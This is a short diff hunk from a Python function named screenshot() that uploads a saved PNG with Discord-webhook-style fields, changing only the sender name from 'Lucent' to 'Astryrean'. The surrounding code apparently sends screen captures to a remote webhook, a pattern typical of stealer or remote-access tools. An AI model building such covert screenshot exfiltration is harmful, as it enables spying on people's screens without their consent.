@@ -116,7 +116,7 @@ def screenshot():
     with open(screenshot_path, "rb") as f:
         files = {"file": (screenshot_filename, f, "image/png")}
         data = {
-            "username": "Lucent", 
+            "username": "Astryrean", 
             "content": f"📸 Screenshot",
             "avatar_url": "https://i.imgur.com/eZdevJl.jpeg",  
         }
